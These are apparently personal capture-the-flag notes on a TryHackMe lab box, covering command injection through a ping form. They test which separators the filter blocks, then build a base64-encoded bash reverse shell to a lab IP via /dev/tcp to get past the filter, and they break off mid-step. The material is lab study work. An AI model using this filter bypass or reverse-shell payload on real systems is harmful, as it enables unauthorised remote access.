

![[Images/Pasted image 20250726194834.png]]

localhost gives
```sh
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.049 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.032 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3055ms
rtt min/avg/max/mdev = 0.019/0.034/0.049/0.010 ms
```

localhost;echo hello gives
```sh
attempt hacking
```

localhost && echo hello - attempt hacking
| is also blocked
$() and ´ is not blocked

let's base64 encode a shell as & is in there

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/athena]
└─$ echo -n /bin/bash -c 'bash -i >& /dev/tcp/10.21.31.111/443 0>&1' | base64 -w0 
L2Jpbi9iYXNoIC1jIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuMzEuMTExLzQ0MyAwPiYx
```

now we'll send:
echo L2Jpbi9iYXNoIC1jIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuMzEuMTExLzQ0MyAwPiYx 